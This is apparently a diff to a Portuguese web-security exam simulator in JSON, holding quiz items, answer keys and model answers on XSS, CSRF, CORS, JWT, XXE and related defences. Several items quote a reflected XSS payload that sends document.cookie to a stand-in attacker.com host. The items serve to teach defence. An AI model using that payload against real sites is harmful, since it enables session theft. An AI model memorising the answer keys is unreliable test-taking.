@@ -1,167 +1,170 @@
 {
-  "titulo": "Exame de Avaliação Modelo 5 (Teoria SSI - Web Security)",
-  "descricao": "Simulador de exame.",
-  "perguntas": [
+  "title": "Exame de Avaliação Modelo 5 (Teoria SSI - Web Security)",
+  "description": "Simulador de exame.",
+  "languages": [
+    "pt"
+  ],
+  "questions": [
     {
-      "tipo": "boolean",
-      "cabecalho": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
-      "pergunta": "O pedido ilustra uma tentativa de exploração de Cross-Site Scripting (XSS) Refletido.",
-      "solucao": 0
+      "type": "boolean",
+      "header": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
+      "question": "O pedido ilustra uma tentativa de exploração de Cross-Site Scripting (XSS) Refletido.",
+      "solution": 0
     },
     {
-      "tipo": "boolean",
-      "cabecalho": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
-      "pergunta": "Se as cookies `session_id` e `JSESSIONID` tivessem a flag de segurança `HttpOnly` ativada nativamente, o script injetado com sucesso não conseguiria aceder e exfiltrar o seu conteúdo através da chamada DOM `document.cookie`.",
-      "solucao": 0
+      "type": "boolean",
+      "header": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
+      "question": "Se as cookies `session_id` e `JSESSIONID` tivessem a flag de segurança `HttpOnly` ativada nativamente, o script injetado com sucesso não conseguiria aceder e exfiltrar o seu conteúdo através da chamada DOM `document.cookie`.",
+      "solution": 0
     },
     {
-      "tipo": "boolean",
-      "cabecalho": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
-      "pergunta": "A vulnerabilidade exemplificada no cabeçalho enquadra-se no tipo SQL Injection, visto que tenta inequivocamente forçar a injeção remota de uma query destrutiva na base de dados (backend) do lojista.",
-      "solucao": 1
+      "type": "boolean",
+      "header": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
+      "question": "A vulnerabilidade exemplificada no cabeçalho enquadra-se no tipo SQL Injection, visto que tenta inequivocamente forçar a injeção remota de uma query destrutiva na base de dados (backend) do lojista.",
+      "solution": 1
     },
     {
-      "tipo": "boolean",
-      "cabecalho": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
-      "pergunta": "A política fundacional Same-Origin Policy (SOP) existente nativamente nos browsers web modernos impede de raiz a própria execução do payload (script), uma vez que a origem intrínseca do script externo é reconhecidamente diferente da origem autorizada do site.",
-      "solucao": 1
+      "type": "boolean",
+      "header": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
+      "question": "A política fundacional Same-Origin Policy (SOP) existente nativamente nos browsers web modernos impede de raiz a própria execução do payload (script), uma vez que a origem intrínseca do script externo é reconhecidamente diferente da origem autorizada do site.",
+      "solution": 1
     },
     {
-      "tipo": "boolean",
-      "cabecalho": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
-      "pergunta": "Uma mitigação robusta contra esta classe exata de vetores de ataque seria a implementação estrita de uma Content Security Policy (CSP) que impeça a execução descontrolada de scripts embutidos (inline) e limite a origem dos scripts externos apenas a domínios de confiança conhecidos do programador.",
-      "solucao": 0
+      "type": "boolean",
+      "header": "Considere o seguinte pedido HTTP intercetado entre o browser de um utilizador e um servidor aplicacional:\n\nGET /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> HTTP/1.1\nHost: loja.online.pt\nCookie: session_id=abc123_valid; JSESSIONID=987654321",
+      "question": "Uma mitigação robusta contra esta classe exata de vetores de ataque seria a implementação estrita de uma Content Security Policy (CSP) que impeça a execução descontrolada de scripts embutidos (inline) e limite a origem dos scripts externos apenas a domínios de confiança conhecidos do programador.",
+      "solution": 0
     },
     {
-      "tipo": "boolean",
-      "pergunta": "O ataque de Cross-Site Request Forgery (CSRF) ocorre sistematicamente quando um atacante consegue ultrapassar as barreiras de rede e efetuar uma extração e cópia (leitura) remota dos dados bancários estáticos do utilizador logado através de fraquezas na SOP.",
-      "solucao": 1
+      "type": "boolean",
+      "question": "O ataque de Cross-Site Request Forgery (CSRF) ocorre sistematicamente quando um atacante consegue ultrapassar as barreiras de rede e efetuar uma extração e cópia (leitura) remota dos dados bancários estáticos do utilizador logado através de fraquezas na SOP.",
+      "solution": 1
     },
     {
-      "tipo": "boolean",
-      "pergunta": "O mecanismo de cabeçalho Web nomeado HTTP Strict Transport Security (HSTS) força imperativamente que, nas visitas e interações futuras, o browser do utilizador comande em exclusivo todas as ligações ao domínio abrangido via canais cifrados em HTTPS, anulando largamente o risco de manipulação de tráfego (SSL Stripping).",
-      "solucao": 0
+      "type": "boolean",
+      "question": "O mecanismo de cabeçalho Web nomeado HTTP Strict Transport Security (HSTS) força imperativamente que, nas visitas e interações futuras, o browser do utilizador comande em exclusivo todas as ligações ao domínio abrangido via canais cifrados em HTTPS, anulando largamente o risco de manipulação de tráfego (SSL Stripping).",
+      "solution": 0
     },
     {
-      "tipo": "boolean",
-      "pergunta": "O recurso sistémico do lado do código Backend (e.g. PHP/Java) à parametrização (Prepared Statements) para as interações diretas e processamento de consultas impede o surgimento universal das falhas de SQL Injection porque abstrai, limpa e segrega sintaticamente a query estrutural real contra quaisquer variáveis e instruções controladas exteriormente pelos clientes.",
-      "solucao": 0
+      "type": "boolean",
+      "question": "O recurso sistémico do lado do código Backend (e.g. PHP/Java) à parametrização (Prepared Statements) para as interações diretas e processamento de consultas impede o surgimento universal das falhas de SQL Injection porque abstrai, limpa e segrega sintaticamente a query estrutural real contra quaisquer variáveis e instruções controladas exteriormente pelos clientes.",
+      "solution": 0
     },
     {
-      "tipo": "boolean",
-      "pergunta": "Em contextos dinâmicos web de SPAs modernas, o CORS (Cross-Origin Resource Sharing) corresponde na sua essência a um protocolo protetor focado a impedir tentativas agressivas em camada 7 para executar negações de serviço temporárias (DDoS volumétricos) a interfaces API isoladas na Internet.",
-      "solucao": 1
+      "type": "boolean",
+      "question": "Em contextos dinâmicos web de SPAs modernas, o CORS (Cross-Origin Resource Sharing) corresponde na sua essência a um protocolo protetor focado a impedir tentativas agressivas em camada 7 para executar negações de serviço temporárias (DDoS volumétricos) a interfaces API isoladas na Internet.",
+      "solution": 1
     },
     {
-      "tipo": "boolean",
-      "pergunta": "A introdução sistemática por parte das frameworks (ex. Django/Spring) de tokens estocásticos 'Anti-CSRF' no desenho de sessões e inseridos silenciosamente no state dos formulários representa a mitigação padrão aconselhada, e virtualmente inquebrável por métodos clássicos, para invalidar explorações de Forja de Requisições Transversais a utilizadores logados.",
-      "solucao": 0
+      "type": "boolean",
+      "question": "A introdução sistemática por parte das frameworks (ex. Django/Spring) de tokens estocásticos 'Anti-CSRF' no desenho de sessões e inseridos silenciosamente no state dos formulários representa a mitigação padrão aconselhada, e virtualmente inquebrável por métodos clássicos, para invalidar explorações de Forja de Requisições Transversais a utilizadores logados.",
+      "solution": 0
     },
     {
-      "tipo": "escrita",
-      "pergunta": "Explique de forma detalhada a distinção técnica e operacional que subjaz o ciclo de vida de uma vulnerabilidade entre a injeção baseada em Cross-Site Scripting (XSS) do tipo Refletido face a uma do tipo Armazenado/Persistente (Stored XSS). Indique ainda inequivocamente qual das referidas tem um potencial intrínseco de disseminação a múltiplos alvos e gravidade corporativa tipicamente acrescida, fundamentando sucintamente o porquê da sua resposta na arquitetura web.",
-      "solucao": "Diferença entre XSS Refletido e Stored XSS:\n\n- XSS Refletido: O payload malicioso faz parte do pedido HTTP enviado ao servidor (ex: via parâmetro URL) e é refletido na resposta para essa requisição única. Exige que a vítima clique num link manipulado.\n- Stored XSS: O payload é guardado permanentemente no servidor (ex: base de dados). Sempre que qualquer utilizador acede à página infectada, o script executa no seu browser.\n- Maior Gravidade: Stored XSS é mais grave, pois afeta passivamente qualquer utilizador que visite a página legítima vulnerável, sem necessidade de enviar links manipulados a cada alvo individual."
+      "type": "escrita",
+      "question": "Explique de forma detalhada a distinção técnica e operacional que subjaz o ciclo de vida de uma vulnerabilidade entre a injeção baseada em Cross-Site Scripting (XSS) do tipo Refletido face a uma do tipo Armazenado/Persistente (Stored XSS). Indique ainda inequivocamente qual das referidas tem um potencial intrínseco de disseminação a múltiplos alvos e gravidade corporativa tipicamente acrescida, fundamentando sucintamente o porquê da sua resposta na arquitetura web.",
+      "solution": "Diferença entre XSS Refletido e Stored XSS:\n\n- XSS Refletido: O payload malicioso faz parte do pedido HTTP enviado ao servidor (ex: via parâmetro URL) e é refletido na resposta para essa requisição única. Exige que a vítima clique num link manipulado.\n- Stored XSS: O payload é guardado permanentemente no servidor (ex: base de dados). Sempre que qualquer utilizador acede à página infectada, o script executa no seu browser.\n- Maior Gravidade: Stored XSS é mais grave, pois afeta passivamente qualquer utilizador que visite a página legítima vulnerável, sem necessidade de enviar links manipulados a cada alvo individual."
     },
     {
-      "pergunta": "No universo do risco padronizado pela OWASP (Top 10), as debilidades agrupadas como falhas de Quebra de Controlo de Acesso (Broken Access Control) tipificam maioritariamente situações e cenários organizacionais onde:",
-      "opcoes": [
+      "question": "No universo do risco padronizado pela OWASP (Top 10), as debilidades agrupadas como falhas de Quebra de Controlo de Acesso (Broken Access Control) tipificam maioritariamente situações e cenários organizacionais onde:",
+      "options": [
         "A. O backend falha transversalmente num audit e aloja fisicamente credenciais protegidas e hasheadas incorretamente em MD5.",
         "B. Um sujeito mal-intencionado comum manipula interativamente o descritor de um URL, endpoint API ou chave de objeto (ex: `id=123`) transpondo e burlando defesas laterais ou superiores sem ser avaliado o estado da sua autorização prévia pelo controlador lógico.",
         "C. Elementos em scripting front-end sofrem minificação e ofuscação não autorizada corrompendo fluxos analíticos e telemetria interna do browser.",
         "D. Todo o conjunto das instâncias de bases de dados expõe portas locais não seguras ou debug hooks públicos e não filtrados ao exterior da infraestrutura nativa.",
         "E. Nenhuma das respostas apresentadas está correta."
       ],
-      "solucao": [
+      "solution": [
         1
       ]
     },
     {
-      "pergunta": "Considerando o panorama dos constrangimentos de mitigação clássica das tecnologias Web, a norma diretiva limitadora 'Same Origin Policy' (SOP) constitui-se o fulcro do isolamento global nas sandboxes dos tabuladores. Que critério restritivo rege e dita corretamente uma avaliação positiva para se catalogarem dois recursos como pertencendo estritamente sob a égide da 'Mesma Origem'?",
-      "opcoes": [
+      "question": "Considerando o panorama dos constrangimentos de mitigação clássica das tecnologias Web, a norma diretiva limitadora 'Same Origin Policy' (SOP) constitui-se o fulcro do isolamento global nas sandboxes dos tabuladores. Que critério restritivo rege e dita corretamente uma avaliação positiva para se catalogarem dois recursos como pertencendo estritamente sob a égide da 'Mesma Origem'?",
+      "options": [
         "A. Os URL avaliados na transação iterativa coincidem de modo integral ou exato exclusivamente na sub-rede remetida pelo endereço de IP extraído da tabela ARP resolvida localmente na firewall do sistema.",
         "B. Duas chamadas ou domínios assumem-se integrados e partilhando a Mesma Origem apenas se houver correspondência estrita perante os três vetores de chave em simultâneo: Protocolo/Esquema da chamada HTTP, o Domínio explícito/FQDN, e a Porta ou socket do serviço em processamento ativo.",
         "C. O browser confirma como origem idêntica todas as chamadas geradas para endereços Web munidos do mesmíssimo selo de raiz da Autenticação Pública Criptográfica (CA X.509 em uso no HTTPS).",
         "D. Encontram-se enables restrições e relaxamentos cruzados automáticos sob a premissa de que os protocolos Web transitam entre si (HTTP e HTTPS são agnósticos em controlo de isolamento).",
         "E. Nenhuma das respostas apresentadas está correta."
       ],
-      "solucao": [
+      "solution": [
         1
       ]
     },
     {
-      "pergunta": "Em contextos modernos de aplicações e microsserviços onde domina a alocação de autorizações e claims via JWT (JSON Web Tokens), torna-se indispensável entender as garantias reais disponibilizadas. Selecione a opção verídica:",
-      "opcoes": [
+      "question": "Em contextos modernos de aplicações e microsserviços onde domina a alocação de autorizações e claims via JWT (JSON Web Tokens), torna-se indispensável entender as garantias reais disponibilizadas. Selecione a opção verídica:",
+      "options": [
         "A. A norma clássica nativa dita que todo o conteúdo estático do JWT e o body dos claims enviados nos payloads encontram-se integralmente ocultos e encriptados na payload JWE com chaves PGP rotativas que protegem o JWT base do escrutínio dos atacantes no Front-End.",
         "B. O mecanismo providencia uma segurança de estado descentralizada ('Stateless'); o backend abstém-se formalmente de reter informações da sessão persistida localmente nas suas próprias tabelas visto garantir a veracidade exclusiva e blindagem do payload pelo anexo e assinatura imutável da hash criptográfica MAC (ex. HS256 / RS256).",
         "C. Sofrem nativamente a incapacidade estrutural inultrapassável à manipulação contra SQL Injection direta a menos que o flag do browser de leitura em HTTPOnly se expresse ativo no corpo HTML principal enviado via server render.",
         "D. Implementam restritamente no ecossistema ECMAScript (JS) o descarte e limpeza estática RAM expurgando e desativando cada sessão local na janela aberta nos precisos 15 minutos em contínuo de expiração de evento.",
         "E. Nenhuma das respostas apresentadas está correta."
       ],
-      "solucao": [
+      "solution": [
         1
       ]
     },
     {
-      "pergunta": "Ao defrontar-se num projeto com a real e incontornável necessidade funcional (e arquitetural) que exige a interação livre de leitura assíncrona entre o seu SPA web alojado num domínio originário e a receção de dados providenciados por serviços alojados estritamente em domínios detidos por terceiros bloqueados pelo SOP, o que carece de concretização imperativa e normalizada do lado do serviço de backend acedido?",
-      "opcoes": [
+      "question": "Ao defrontar-se num projeto com a real e incontornável necessidade funcional (e arquitetural) que exige a interação livre de leitura assíncrona entre o seu SPA web alojado num domínio originário e a receção de dados providenciados por serviços alojados estritamente em domínios detidos por terceiros bloqueados pelo SOP, o que carece de concretização imperativa e normalizada do lado do serviço de backend acedido?",
+      "options": [
         "A. Fornecimento manual do header explícito HTTP designado 'Access-Control-Allow-Origin: *' generalizado sem triagem a todos os chamadores integrando paralelamente flags perigosos com premissas em 'Access-Control-Allow-Credentials: true' contíguas sem filtragem para agilizar pacotes.",
         "B. Exigir ativamente a suspensão global dos trâmites de encriptação ao não sinalizar o valor booleano 'Secure' à payload da cookie central autenticada exposta pela sessão.",
         "C. O recurso à incorporação ativada transversal dos Standards e fluxos providenciados pelo pacote das normas CORS com o processamento cirúrgico restrito dos headers apropriados e autoritativos sempre que o servidor for assediado nas requisições preflight em 'OPTIONS'.",
         "D. A subversão estruturada e controlada com recurso a encapsulamento dinâmico em IFrames secundários com o intuito focado em desativar restrições via os tokens portáteis em querystrings de OAuth integrados diretamente nos GETs.",
         "E. Nenhuma das respostas apresentadas está correta."
       ],
-      "solucao": [
+      "solution": [
         2
       ]
     },
     {
-      "pergunta": "A clássica família de debilidades lógicas de interacção identificadas correntemente por transversalidades em navegação diretória vulgo Path Traversal englobam as falhas que exploram os webservers a modo de os viabilizar a:",
-      "opcoes": [
+      "question": "A clássica família de debilidades lógicas de interacção identificadas correntemente por transversalidades em navegação diretória vulgo Path Traversal englobam as falhas que exploram os webservers a modo de os viabilizar a:",
+      "options": [
         "A. Iterar queries em cascata profunda de SQL e sub-queries focadas num ataque progressivo e exaustivo aos registos ou dicionários transacionais blindados de instâncias externas de DataBases.",
         "B. Provocar o desvio abusivo de contextos internos por vetores relativos, saltando (escapando) o var/www originário dos Document Roots para a exibição de recursos fundamentais sensíveis escondidos ou trancados em diretorias globais sensíveis (e.g. via concatenações subvertidas em '../') da plataforma host.",
         "C. Sobrescrever respostas DNS para os browsers recetores em pacotes UDP intercetados simulando a execução temporária de códigos inofensivos da classe HTTP 302 Movidos Temporariamente contra URLs envenenadas.",
         "D. Substituir e forçar binários de threads normais do backend (Workers de Python/PHP) para se auto-atribuírem privilégios nativos em bash interativas de SUID 0.",
         "E. Nenhuma das respostas apresentadas está correta."
       ],
-      "solucao": [
+      "solution": [
         1
       ]
     },
     {
-      "pergunta": "Em Segurança da Aplicação (AppSec), na ótica primordial preventiva adotada à face das diversas interações do utilizador final e manipulação na sanitização de conteúdos (Input Validation), qual modelo se prova de excelência global para anular surpresas e comportamentos desastrosos da máquina de estado perante dados não conformes?",
-      "opcoes": [
+      "question": "Em Segurança da Aplicação (AppSec), na ótica primordial preventiva adotada à face das diversas interações do utilizador final e manipulação na sanitização de conteúdos (Input Validation), qual modelo se prova de excelência global para anular surpresas e comportamentos desastrosos da máquina de estado perante dados não conformes?",
+      "options": [
         "A. O escrutínio exaustivo dos strings assente numa metodologia perita de 'Blacklisting' em banir a utilização integral de carateres ativamente perniciosos ou destrutivos conhecidos mundialmente à data (e.g. apóstrofos, thetag tags e escapes booleanos).",
         "B. Instanciar a triagem interativa baseada apenas através da interface do Javascript web do lado cliente (client-side), bloqueando logicamente o submission e preservando eternamente sem processamento exaustivo a cloud e do seu cluster backend.",
         "C. Implementar arquitetonicamente 'Whitelisting' exato, determinista e unicamente focado e assente em rigorosa aceitação de esquemas semânticos estritos restritos aos perfis exatos esperados de dados permitidos e validados pela ótica exclusiva e isolada do próprio sistema base intercetor (server-side).",
         "D. A execução da manipulação ou casting nativo na conversão a string de binários em Base64 de todos os fluxos como modo cego e universal de defesa sem filtragem posterior associada a carateres submetidos pelo JSON transacionado.",
         "E. Nenhuma das respostas apresentadas está correta."
       ],
-      "solucao": [
+      "solution": [
         2
       ]
     },
     {
-      "pergunta": "Quando defrontado com a tipologia e estrutura complexa e interligada de uma injeção de classes de XXE (XML External Entity) direcionadas perversamente contra os processadores do ecossistema backend exposto a parse XML/SOAP do cliente exterior, qual a mitigação defensiva de fundo recomendada pelo OWASP no processo transversal contra o perigo de interceções sistémicas vitais (leitura arbitrária local e remota / Server Side Request Forgery associada)?",
-      "opcoes": [
+      "question": "Quando defrontado com a tipologia e estrutura complexa e interligada de uma injeção de classes de XXE (XML External Entity) direcionadas perversamente contra os processadores do ecossistema backend exposto a parse XML/SOAP do cliente exterior, qual a mitigação defensiva de fundo recomendada pelo OWASP no processo transversal contra o perigo de interceções sistémicas vitais (leitura arbitrária local e remota / Server Side Request Forgery associada)?",
+      "options": [
         "A. Obrigar a que o motor de processamento (o Parser XML implementado/utilizado no ecossistema Web) tenha inibida e ativamente desativada, quer a funcionalidade das chamadas das entidades e URIs alógenas perigosas ligadas dinamicamente ao XML base, quer os DOCTYPEs associados a DTDs maliciosos injetados pelo emissor.",
         "B. Reforçar o isolamento imposto pelas chamadas assíncronas do encapsulamento em cifras puras geridas pelo endpoint de terminação (TLS/SSL) forçando uma negação perentória sem restrições lógicas do objeto enviado ao frontend.",
         "C. Circunscrever, delimitar e bloquear com regras físicas os XMLs superiores a margens de processamento RAM (ex. limitação restrita de fileuploads globais nos Content-Lengths a ficheiros truncados de 1 Megabyte máximo por socket).",
         "D. Focar a proteção exclusivamente por integração imutável em cabos ou restrições nos headers das comunicações API por diretivas passivas das flags no header padrão em HTTPOnly forçando uma barreira nos requests REST.",
         "E. Nenhuma das respostas apresentadas está correta."
       ],
-      "solucao": [
+      "solution": [
         0
       ]
     },
     {
-      "tipo": "escrita",
-      "pergunta": "Num túnel HTTPS contemporâneo robusto sob um canal TLS bem mantido, que característica protocolar transaccional imperativa protege e inviabiliza as fugas ou retrospetivas do lado da decifragem massiva nos dados transmitidos no passado mesmo numa hipotética rotura de sigilo, confisco intergovernamental de data centers (compromisso da chave asimétrica a longo prazo dos servidores certificados do próprio lojista)?",
-      "solucao": "O mecanismo é o Sigilo Perfeito Adiante (Perfect Forward Secrecy - PFS). Ele garante que, mesmo que a chave privada de longo prazo do servidor seja comprometida, as chaves de sessão individuais (usadas para cifrar cada conexão) não possam ser derivadas, pois estas são geradas dinamicamente durante o handshake (ex: via Diffie-Hellman efêmero) e descartadas após a conclusão da sessão."
+      "type": "escrita",
+      "question": "Num túnel HTTPS contemporâneo robusto sob um canal TLS bem mantido, que característica protocolar transaccional imperativa protege e inviabiliza as fugas ou retrospetivas do lado da decifragem massiva nos dados transmitidos no passado mesmo numa hipotética rotura de sigilo, confisco intergovernamental de data centers (compromisso da chave asimétrica a longo prazo dos servidores certificados do próprio lojista)?",
+      "solution": "O mecanismo é o Sigilo Perfeito Adiante (Perfect Forward Secrecy - PFS). Ele garante que, mesmo que a chave privada de longo prazo do servidor seja comprometida, as chaves de sessão individuais (usadas para cifrar cada conexão) não possam ser derivadas, pois estas são geradas dinamicamente durante o handshake (ex: via Diffie-Hellman efêmero) e descartadas após a conclusão da sessão."
     },
     {
-      "tipo": "escrita",
-      "pergunta": "Imagine que detém responsabilidade integral numa tarefa imperativa com o foco vital em conduzir e redigir o balanço numa auditoria pericial técnica e arquitetural focada a uma antiga, monolítica e obsoleta aplicação em backend de transação bancária legada num repositório alojado publicamente (tipo infraestrutura tradicional Web 2.0). Descreva exaustivamente, mas contextualizado perante todo o corpo de conhecimento das defesas mitigatórias essenciais de base padronizadas ativamente nas normativas gerais da OWASP e nas práticas operacionais robustas modernas dos standards criptográficos HTTPS, exatos 3 mecanismos ou métodos práticos inegociáveis. As referidas 3 proteções devem obrigatoriamente preencher lacunas distintas: um dos eixos a referir tem que garantir na íntegra que as transações na Rede se processam sem exposição direta em interceptação em texto-limpo contra o sigilo passivo; num segundo eixo referir o mecanismo base com que protegeria nos browsers clientes a viabilidade isolada nas flags de integridade a roubos de sessão assentes na sandboxing; e um terceiro pilar arquitetural final demonstrativo sobre a imunização do ecossistema das injeções clássicas sobre manipulação base dos drivers interativos na base de dados no interior (SQL backend injetável).",
-      "solucao": "1. **Sigilo na Rede (Evitar interceptação em texto-limpo):** Utilização obrigatória de HTTPS com TLS 1.3 configurado para usar Perfect Forward Secrecy (PFS), além da diretiva HSTS (HTTP Strict Transport Security) com a flag preload, para forçar o navegador a usar sempre ligações seguras e prevenir ataques de downgrade.\n\n2. **Segurança de Sessões no Browser:** Definição das flags `HttpOnly` (impede acesso do JavaScript ao cookie via document.cookie, mitigando XSS), `Secure` (garante envio exclusivo através de HTTPS) e `SameSite=Strict` ou `Lax` (atenua ataques CSRF) nos cookies de sessão/autenticação.\n\n3. **Prevenção de Injeções SQL (Backend):** Implementação obrigatória de Consultas Parametrizadas (Prepared Statements / Parameterized Queries) ao interagir com a base de dados, garantindo que o interpretador SQL trata qualquer input do utilizador estritamente como dados e nunca como comandos executáveis."
+      "type": "escrita",
+      "question": "Imagine que detém responsabilidade integral numa tarefa imperativa com o foco vital em conduzir e redigir o balanço numa auditoria pericial técnica e arquitetural focada a uma antiga, monolítica e obsoleta aplicação em backend de transação bancária legada num repositório alojado publicamente (tipo infraestrutura tradicional Web 2.0). Descreva exaustivamente, mas contextualizado perante todo o corpo de conhecimento das defesas mitigatórias essenciais de base padronizadas ativamente nas normativas gerais da OWASP e nas práticas operacionais robustas modernas dos standards criptográficos HTTPS, exatos 3 mecanismos ou métodos práticos inegociáveis. As referidas 3 proteções devem obrigatoriamente preencher lacunas distintas: um dos eixos a referir tem que garantir na íntegra que as transações na Rede se processam sem exposição direta em interceptação em texto-limpo contra o sigilo passivo; num segundo eixo referir o mecanismo base com que protegeria nos browsers clientes a viabilidade isolada nas flags de integridade a roubos de sessão assentes na sandboxing; e um terceiro pilar arquitetural final demonstrativo sobre a imunização do ecossistema das injeções clássicas sobre manipulação base dos drivers interativos na base de dados no interior (SQL backend injetável).",
+      "solution": "1. **Sigilo na Rede (Evitar interceptação em texto-limpo):** Utilização obrigatória de HTTPS com TLS 1.3 configurado para usar Perfect Forward Secrecy (PFS), além da diretiva HSTS (HTTP Strict Transport Security) com a flag preload, para forçar o navegador a usar sempre ligações seguras e prevenir ataques de downgrade.\n\n2. **Segurança de Sessões no Browser:** Definição das flags `HttpOnly` (impede acesso do JavaScript ao cookie via document.cookie, mitigando XSS), `Secure` (garante envio exclusivo através de HTTPS) e `SameSite=Strict` ou `Lax` (atenua ataques CSRF) nos cookies de sessão/autenticação.\n\n3. **Prevenção de Injeções SQL (Backend):** Implementação obrigatória de Consultas Parametrizadas (Prepared Statements / Parameterized Queries) ao interagir com a base de dados, garantindo que o interpretador SQL trata qualquer input do utilizador estritamente como dados e nunca como comandos executáveis."
     }
   ]
 }
